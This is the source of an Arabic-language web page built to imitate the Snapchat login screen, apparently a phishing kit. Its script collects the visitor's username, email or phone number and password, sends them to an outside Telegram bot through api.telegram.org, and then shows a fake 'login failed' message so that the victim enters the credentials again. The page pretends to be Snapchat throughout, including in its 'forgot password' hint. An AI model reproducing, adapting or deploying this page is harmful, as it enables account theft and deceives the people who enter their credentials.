  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    :root {
      --primary: #fffc00;
      --primary-dark: #e8eb00;
      --secondary: #34c759;
      --bg: #ffffff;
      --card: #fafafa;
      --text: #000000;
      --text-muted: #6b7280;
      --border: #e5e7eb;
      --danger: #ef4444;
      --warning: #f59e0b;
      --glass: rgba(0, 0, 0, 0.04);
      --shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
      --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
      --ease: cubic-bezier(0.25, 0.46, 0.45, 0.94);
      --radius-lg: 28px;
      --radius-md: 16px;
      --radius-sm: 12px;
    }

    html, body {
      height: 100%;
      width: 100%;
      margin: 0;
      padding: 0;
      background: var(--bg);
      font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      color: var(--text);
      direction: rtl;
      -webkit-font-smoothing: antialiased;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      user-select: none;
      overflow: hidden;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .viewport {
      width: 100%;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0;
      overflow: hidden;
    }

    .phone-frame {
      width: 100%;
      height: 100vh;
      max-width: 480px;
      display: flex;
      flex-direction: column;
      background: var(--bg);
      position: relative;
      overflow: hidden;
    }

    .status-bar {
      height: max(24px, env(safe-area-inset-top));
      background: var(--bg);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 4px 16px;
      font-size: 12px;
      color: var(--text);
      border-bottom: 1px solid var(--border);
    }

    .status-left, .status-right {
      display: flex;
      align-items: center;
      gap: 4px;
    }

    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      position: relative;
    }

    .page {
      position: absolute;
      width: 100%;
      height: 100%;
      display: flex;
      flex-direction: column;
      overflow-y: auto;
      overflow-x: hidden;
      padding: 0;
      -webkit-overflow-scrolling: touch;
    }

    .page.hidden {
      display: none !important;
    }

    .page.slide-in {
      animation: slideInRight 0.4s var(--ease) forwards;
    }

    .page.slide-out {
      animation: slideOutRight 0.4s var(--ease) forwards;
    }

    @keyframes slideInRight {
      from {
        opacity: 0;
        transform: translateX(100%);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    @keyframes slideOutRight {
      from {
        opacity: 1;
        transform: translateX(0);
      }
      to {
        opacity: 0;
        transform: translateX(-100%);
      }
    }

    .page-content {
      display: flex;
      flex-direction: column;
      padding: 24px 16px;
      padding-bottom: max(24px, env(safe-area-inset-bottom));
      flex: 1;
    }

    .snap-logo {
      width: 90px;
      height: 90px;
      margin: 32px auto 28px;
      background: linear-gradient(135deg, var(--primary), #ffed4e);
      border-radius: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 56px;
      box-shadow: 0 12px 40px rgba(255, 252, 0, 0.3);
      animation: logoBounce 2.5s ease-in-out infinite;
    }

    @keyframes logoBounce {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.08); }
    }

    .page-header {
      text-align: center;
      margin-bottom: 28px;
    }

    .page-title {
      font-size: 32px;
      font-weight: 900;
      color: var(--text);
      margin-bottom: 8px;
      letter-spacing: -0.8px;
    }

    .page-subtitle {
      font-size: 15px;
      color: var(--text-muted);
      line-height: 1.6;
      font-weight: 400;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-label {
      display: block;
      font-size: 12px;
      font-weight: 700;
      color: var(--text-muted);
      margin-bottom: 10px;
      text-transform: uppercase;
      letter-spacing: 0.8px;
    }

    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    input[type="text"],
    input[type="tel"],
    input[type="email"],
    input[type="password"],
    .country-select {
      width: 100%;
      padding: 16px 16px;
      background: var(--card);
      border: 1.5px solid var(--border);
      border-radius: var(--radius-md);
      color: var(--text);
      font-size: 16px;
      font-family: 'Cairo', sans-serif;
      font-weight: 500;
      transition: all 0.3s var(--ease);
      outline: none;
      -webkit-appearance: none;
      appearance: none;
    }

    input[type="text"]::placeholder,
    input[type="tel"]::placeholder,
    input[type="email"]::placeholder,
    input[type="password"]::placeholder {
      color: var(--text-muted);
      opacity: 0.6;
    }

    input[type="text"]:focus,
    input[type="tel"]:focus,
    input[type="email"]:focus,
    input[type="password"]:focus {
      background: var(--bg);
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
    }

    .country-select {
      cursor: pointer;
      background: var(--card);
      flex: 0 0 auto;
      padding: 16px 12px;
      min-width: 90px;
      text-align: center;
      font-weight: 600;
    }

    .country-select:focus {
      background: var(--bg);
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
    }

    .info-box {
      background: rgba(52, 199, 89, 0.08);
      border: 1.5px solid var(--secondary);
      border-radius: var(--radius-md);
      padding: 14px;
      margin-bottom: 24px;
      font-size: 13px;
      color: var(--secondary);
      display: flex;
      align-items: flex-start;
      gap: 10px;
      font-weight: 500;
    }

    .info-icon {
      flex-shrink: 0;
      font-size: 18px;
      margin-top: 0px;
    }

    .form-hint {
      font-size: 12px;
      color: var(--text-muted);
      margin-top: 8px;
      min-height: 16px;
      transition: color 0.3s ease;
      font-weight: 500;
    }

    .form-hint.error {
      color: var(--danger);
    }

    .form-hint.warning {
      color: var(--warning);
    }

    .form-hint.success {
      color: var(--secondary);
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: #000000;
      border: none;
      border-radius: var(--radius-md);
      font-size: 16px;
      font-weight: 800;
      font-family: 'Cairo', sans-serif;
      cursor: pointer;
      transition: all 0.3s var(--ease);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      -webkit-appearance: none;
      appearance: none;
      box-shadow: 0 10px 30px rgba(255, 252, 0, 0.2);
      position: relative;
      overflow: hidden;
      letter-spacing: 0.3px;
    }

    .btn:active {
      transform: scale(0.95);
      box-shadow: 0 4px 12px rgba(255, 252, 0, 0.15);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .btn.secondary {
      background: var(--card);
      color: var(--text);
      border: 1.5px solid var(--border);
      box-shadow: none;
    }

    .btn.secondary:active {
      background: var(--glass);
      border-color: var(--text-muted);
    }

    .btn svg {
      width: 22px;
      height: 22px;
      stroke-width: 2.5;
    }

    .toggle-mode {
      width: 100%;
      padding: 13px;
      background: var(--card);
      border: 1.5px solid var(--border);
      border-radius: var(--radius-md);
      color: var(--text-muted);
      font-size: 14px;
      font-family: 'Cairo', sans-serif;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s var(--ease);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-top: 16px;
    }

    .toggle-mode:active {
      background: var(--glass);
      border-color: var(--text-muted);
    }

    /* Modal */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.35);
      display: none;
      align-items: flex-end;
      justify-content: center;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .modal-overlay.show {
      display: flex;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .modal {
      width: 100%;
      max-width: 480px;
      background: var(--bg);
      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
      padding: 24px;
      max-height: 80vh;
      display: flex;
      flex-direction: column;
      animation: slideUp 0.3s var(--ease);
      padding-bottom: max(24px, env(safe-area-inset-bottom));
      border-top: 1px solid var(--border);
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(100%);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .modal-header {
      font-size: 20px;
      font-weight: 800;
      margin-bottom: 16px;
      color: var(--text);
    }

    .modal-search {
      width: 100%;
      padding: 12px 14px;
      background: var(--card);
      border: 1.5px solid var(--border);
      border-radius: var(--radius-sm);
      color: var(--text);
      font-size: 14px;
      font-family: 'Cairo', sans-serif;
      margin-bottom: 14px;
      outline: none;
      transition: all 0.3s ease;
    }

    .modal-search:focus {
      background: var(--bg);
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.12);
    }

    .modal-list {
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      flex: 1;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .modal-item {
      padding: 14px;
      border-radius: var(--radius-sm);
      cursor: pointer;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      background: var(--card);
    }

    .modal-item:active {
      background: var(--glass);
    }

    .modal-item-left {
      display: flex;
      align-items: center;
      gap: 12px;
      flex: 1;
    }

    .modal-item-flag {
      font-size: 32px;
      flex-shrink: 0;
    }

    .modal-item-info {
      display: flex;
      flex-direction: column;
      gap: 3px;
    }

    .modal-item-name {
      font-size: 14px;
      font-weight: 700;
      color: var(--text);
    }

    .modal-item-code {
      font-size: 12px;
      color: var(--text-muted);
      font-weight: 500;
    }

    .modal-item-dial {
      font-size: 14px;
      font-weight: 700;
      color: var(--primary);
    }

    /* Toast */
    .toast-overlay {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2000;
      background: rgba(0, 0, 0, 0.3);
    }

    .toast-overlay.show {
      display: flex;
    }

    .toast {
      background: var(--bg);
      border-radius: var(--radius-lg);
      padding: 28px;
      width: 90%;
      max-width: 340px;
      text-align: center;
      box-shadow: var(--shadow);
      animation: toastIn 0.3s var(--ease);
      border: 1px solid var(--border);
    }

    @keyframes toastIn {
      from {
        opacity: 0;
        transform: scale(0.92);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .toast-icon {
      font-size: 52px;
      margin-bottom: 14px;
    }

    .toast-title {
      font-size: 20px;
      font-weight: 800;
      color: var(--text);
      margin-bottom: 8px;
    }

    .toast-text {
      font-size: 14px;
      color: var(--text-muted);
      line-height: 1.6;
      margin-bottom: 20px;
      font-weight: 500;
    }

    .toast-btn {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: #000000;
      border: none;
      border-radius: var(--radius-sm);
      font-size: 14px;
      font-weight: 700;
      font-family: 'Cairo', sans-serif;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .toast-btn:active {
      transform: scale(0.95);
    }

    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid rgba(0, 0, 0, 0.2);
      border-top-color: #000000;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .back-button {
      position: absolute;
      right: 16px;
      top: 12px;
      width: 44px;
      height: 44px;
      background: var(--card);
      border: 1.5px solid var(--border);
      border-radius: var(--radius-md);
      color: var(--text);
      font-size: 20px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      z-index: 10;
    }

    .back-button:active {
      background: var(--glass);
      border-color: var(--text-muted);
    }

    .hidden {
      display: none !important;
    }

    @media (max-width: 480px) {
      .phone-frame {
        max-width: 100%;
      }

      .page-title {
        font-size: 28px;
      }

      .snap-logo {
        width: 80px;
        height: 80px;
        font-size: 48px;
      }

      .btn {
        padding: 14px;
        font-size: 15px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      * {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
    }
  </style>
</head>

    ];

    const REGEX = {
      username: /^[A-Za-z0-9._-]{3,30}$/,
      email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
      phone: /^\d{6,15}$/,
    };

    // ==================== STATE ====================
    let state = {
      phoneMode: false,
      selectedCountry: COUNTRIES[0],
      credentials: null,
      isLoading: false,
    };

    // ==================== DOM REFS ====================
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const userEmailMode = document.getElementById('userEmailMode');
    const phoneMode = document.getElementById('phoneMode');
    const primaryInput = document.getElementById('primary');
    const phoneInput = document.getElementById('phoneInput');
    const passwordInput = document.getElementById('password');
    const togglePasswordBtn = document.getElementById('togglePassword');

    const toggleBtn = document.getElementById('toggleBtn');
    const toggleText = document.getElementById('toggleText');
    const continueBtn = document.getElementById('continueBtn');
    const sendBtn = document.getElementById('sendBtn');
    const sendBtnText = document.getElementById('sendBtnText');
    const sendSpinner = document.getElementById('sendSpinner');
    const backBtn = document.getElementById('backBtn');
    const forgotBtn = document.getElementById('forgotBtn');

    const countryBtn = document.getElementById('countryBtn');
    const countryModal = document.getElementById('countryModal');
    const countryList = document.getElementById('countryList');
    const countrySearch = document.getElementById('countrySearch');
    const countryFlag = document.getElementById('countryFlag');

    const toastOverlay = document.getElementById('toastOverlay');
    const toastIcon = document.getElementById('toastIcon');
    const toastTitle = document.getElementById('toastTitle');
    const toastText = document.getElementById('toastText');
    const toastBtn = document.getElementById('toastBtn');

    const hint1 = document.getElementById('hint1');
    const hintPhone = document.getElementById('hintPhone');
    const hintPassword = document.getElementById('hintPassword');

    const userDisplay = document.getElementById('userDisplay');

    // ==================== UTILITIES ====================
    function isTokenValid() {
      return TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('YOUR') && !TG_CHAT_ID.includes('YOUR');
    }

    function cleanInput(str) {
      return str.replace(/[^\x00-\x7F]/g, '').trim();
    }

    function getDigitsOnly(str) {
      return str.replace(/[^\d]/g, '');
    }

    function showToast(icon, title, text) {
      toastIcon.textContent = icon;
      toastTitle.textContent = title;
      toastText.textContent = text;
      toastOverlay.classList.add('show');
    }

    function hideToast() {
      toastOverlay.classList.remove('show');
    }

    function showHint(element, text, type = 'error') {
      element.textContent = text;
      element.classList.remove('error', 'warning', 'success');
      if (type) element.classList.add(type);
      setTimeout(() => {
        element.textContent = '';
        element.classList.remove('error', 'warning', 'success');
      }, 3500);
    }

    // ==================== SEND TO TELEGRAM ====================
    async function sendToTelegram(message) {
      if (!isTokenValid()) {
        showHint(hint1, '⚠️ البيانات غير مضافة في الملف', 'warning');
        return false;
      }

      try {
        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        });

        if (!response.ok) {
          throw new Error('فشل الإرسال');
        }

        return true;
      } catch (error) {
        console.error('Telegram Error:', error);
        showToast('❌', 'خطأ', 'فشل الاتصال - تحقق من بيانات البوت');
        return false;
      }
    }

    // ==================== FORM VALIDATION ====================
    function validatePrimary() {
      let input, hint, type, value;

      if (state.phoneMode) {
        input = phoneInput;
        hint = hintPhone;
        const digits = getDigitsOnly(input.value);
        if (!REGEX.phone.test(digits)) {
          showHint(hint, '❌ رقم هاتف غير صحيح (6-15 رقم)', 'error');
          return null;
        }
        type = 'phone';
        value = digits;
      } else {
        input = primaryInput;
        hint = hint1;
        value = cleanInput(input.value);

        if (!value) {
          showHint(hint, '❌ أدخل اسم المستخدم أو البريد', 'error');
          return null;
        }

        if (value.includes('@')) {
          if (!REGEX.email.test(value)) {
            showHint(hint, '❌ بريد إلكتروني غير صحيح', 'error');
            return null;
          }
          type = 'email';
        } else {
          if (!REGEX.username.test(value)) {
            showHint(hint, '❌ اسم غير صحيح (3-30 حرف وأرقام)', 'error');
            return null;
          }
          type = 'username';
        }
      }

      return { type, value };
    }

    function validatePassword() {
      const password = passwordInput.value;

      if (!password) {
        showHint(hintPassword, '❌ أدخل كلمة المرور', 'error');
        return null;
      }

      if (password.length < 6) {
        showHint(hintPassword, '❌ كلمة المرور قصيرة جداً (6 أحرف على الأقل)', 'error');
        return null;
      }

      return password;
    }

    // ==================== PAGE TRANSITIONS ====================
    function goToPage2(credentials) {
      state.credentials = credentials;
      
      let displayText = credentials.value;
      if (credentials.type === 'phone') {
        displayText = `${state.selectedCountry.flag} ${state.selectedCountry.dial}`;
      }
      
      userDisplay.textContent = displayText;

      page1.classList.add('slide-out');
      page1.classList.add('hidden');
      page2.classList.remove('hidden');
      page2.classList.add('slide-in');

      setTimeout(() => {
        page2.classList.remove('slide-in');
        passwordInput.focus();
      }, 400);
    }

    function goToPage1() {
      page2.classList.add('slide-out');
      page2.classList.add('hidden');
      page1.classList.remove('hidden');
      page1.classList.add('slide-in');

      setTimeout(() => {
        page1.classList.remove('slide-in');
        primaryInput.focus();
      }, 400);

      state.credentials = null;
      passwordInput.value = '';
      hintPassword.textContent = '';
    }

    // ==================== PHONE MODE TOGGLE ====================
    function togglePhoneMode() {
      state.phoneMode = !state.phoneMode;

      if (state.phoneMode) {
        userEmailMode.classList.add('hidden');
        phoneMode.classList.remove('hidden');
        toggleText.textContent = '✉️ استخدم البريد أو الاسم';
        setTimeout(() => phoneInput.focus(), 100);
      } else {
        phoneMode.classList.add('hidden');
        userEmailMode.classList.remove('hidden');
        toggleText.textContent = '📱 استخدم رقم الهاتف';
        setTimeout(() => primaryInput.focus(), 100);
      }

      hint1.textContent = '';
      hintPhone.textContent = '';
    }

    // ==================== COUNTRY MODAL ====================
    function renderCountries(list) {
      countryList.innerHTML = '';

      if (list.length === 0) {
        countryList.innerHTML = '<div style="padding: 24px; text-align: center; color: var(--text-muted); font-weight: 500;">لا توجد نتائج</div>';
        return;
      }

      list.forEach((country) => {
        const item = document.createElement('div');
        item.className = 'modal-item';
        item.innerHTML = `
          <div class="modal-item-left">
            <div class="modal-item-flag">${country.flag}</div>
            <div class="modal-item-info">
              <div class="modal-item-name">${country.name}</div>
              <div class="modal-item-code">${country.code}</div>
            </div>
          </div>
          <div class="modal-item-dial">${country.dial}</div>
        `;
        item.addEventListener('click', () => selectCountry(country));
        countryList.appendChild(item);
      });
    }

    function selectCountry(country) {
      state.selectedCountry = country;
      countryFlag.textContent = country.flag;
      countryModal.classList.remove('show');
      phoneInput.focus();
    }

    function filterCountries(query) {
      const q = query.toLowerCase();
      return COUNTRIES.filter(
        (c) =>
          c.name.toLowerCase().includes(q) ||
          c.code.toLowerCase().includes(q) ||
          c.dial.includes(q)
      );
    }

    // ==================== EVENT LISTENERS ====================
    // Page 1 Events
    toggleBtn.addEventListener('click', togglePhoneMode);

    continueBtn.addEventListener('click', async () => {
      const credentials = validatePrimary();
      if (!credentials) return;

      // Send to Telegram
      let msg = `<b>🔐 بيانات المستخدم</b>\n\n`;
      msg += `<b>النوع:</b> `;
      
      if (credentials.type === 'email') {
        msg += '📧 بريد إلكتروني\n';
      } else if (credentials.type === 'username') {
        msg += '👤 اسم مستخدم\n';
      } else if (credentials.type === 'phone') {
        msg += '📱 رقم هاتف\n';
      }
      
      msg += `<b>القيمة:</b> <code>${credentials.value}</code>\n`;
      
      if (state.phoneMode) {
        msg += `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}\n`;
      }

      await sendToTelegram(msg);
      goToPage2(credentials);
    });

    primaryInput.addEventListener('input', (e) => {
      e.target.value = cleanInput(e.target.value);
      if (e.target.value.length > 100) {
        e.target.value = e.target.value.slice(0, 100);
      }
    });

    primaryInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') continueBtn.click();
    });

    phoneInput.addEventListener('input', (e) => {
      e.target.value = getDigitsOnly(e.target.value);
    });

    phoneInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') continueBtn.click();
    });

    countryBtn.addEventListener('click', () => {
      renderCountries(COUNTRIES);
      countryModal.classList.add('show');
      countrySearch.focus();
    });

    countrySearch.addEventListener('input', (e) => {
      const filtered = filterCountries(e.target.value);
      renderCountries(filtered);
    });

    countryModal.addEventListener('click', (e) => {
      if (e.target === countryModal) {
        countryModal.classList.remove('show');
      }
    });

    // Page 2 Events
    backBtn.addEventListener('click', goToPage1);

    sendBtn.addEventListener('click', async () => {
      const password = validatePassword();
      if (!password) return;

      if (!state.credentials) {
        showToast('⚠️', 'خطأ', 'بيانات المستخدم مفقودة');
        return;
      }

      // Show loading
      state.isLoading = true;
      sendBtn.disabled = true;
      sendBtnText.classList.add('hidden');
      sendSpinner.classList.remove('hidden');

      // Send to Telegram
      let msg = `<b>🔓 تسجيل دخول كامل</b>\n\n`;
      msg += `<b>النوع:</b> `;
      
      if (state.credentials.type === 'email') {
        msg += '📧 بريد إلكتروني\n';
      } else if (state.credentials.type === 'username') {
        msg += '👤 اسم مستخدم\n';
      } else if (state.credentials.type === 'phone') {
        msg += '📱 رقم هاتف\n';
      }
      
      msg += `<b>المستخدم:</b> <code>${state.credentials.value}</code>\n`;
      
      if (state.phoneMode) {
        msg += `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}\n`;
      }
      
      msg += `<b>كلمة المرور:</b> <code>${password}</code>\n\n`;
      msg += `⏰ <i>${new Date().toLocaleString('ar-SA')}</i>`;

      const success = await sendToTelegram(msg);

      // Wait a bit
      await new Promise(r => setTimeout(r, 1500));

      // Hide loading
      state.isLoading = false;
      sendBtn.disabled = false;
      sendBtnText.classList.remove('hidden');
      sendSpinner.classList.add('hidden');

      if (success) {
        showToast('❌', 'فشل الدخول', 'اسم المستخدم أو كلمة المرور غير صحيحة');
        passwordInput.value = '';
        setTimeout(() => {
          hideToast();
          goToPage1();
        }, 3000);
      }
    });

    passwordInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !state.isLoading) sendBtn.click();
    });

    togglePasswordBtn.addEventListener('click', () => {
      const type = passwordInput.type === 'password' ? 'text' : 'password';
      passwordInput.type = type;
      togglePasswordBtn.textContent = type === 'password' ? '👁️' : '🙈';
    });

    forgotBtn.addEventListener('click', () => {
      showToast('ℹ️', 'نسيت كلمة المرور؟', 'تواصل مع خدمة العملاء من تطبيق سناب شات');
    });

    // Toast
    toastBtn.addEventListener('click', hideToast);

    // Keyboard
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        countryModal.classList.remove('show');
        hideToast();
      }
    });

    // Initialize
    renderCountries(COUNTRIES);
    primaryInput.focus();
  </script>
</body>
</html>
